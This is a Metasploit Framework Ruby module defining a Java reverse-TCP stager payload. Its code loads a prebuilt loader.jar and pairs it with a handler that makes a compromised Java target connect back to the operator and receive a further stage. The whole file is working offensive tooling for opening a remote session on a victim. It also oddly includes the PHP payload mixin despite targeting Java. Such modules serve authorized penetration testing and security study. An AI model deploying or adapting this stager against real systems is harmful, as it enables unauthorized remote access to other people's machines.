##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Java Reverse TCP stager',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back stager',
			'Author'        => [
					'mihi',  # all the hard work
					'egypt', # msf integration
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'java',
			'Arch'          => ARCH_JAVA,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        => {'Payload' => ""}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'java', 'loader.jar'))

		print_status("Generated loader.jar (#{reverse.length} bytes)")

		return super + reverse
	end

	def handle_intermediate_stage(conn, payload)
		conn.put([payload.length].pack("N"))
	end

end

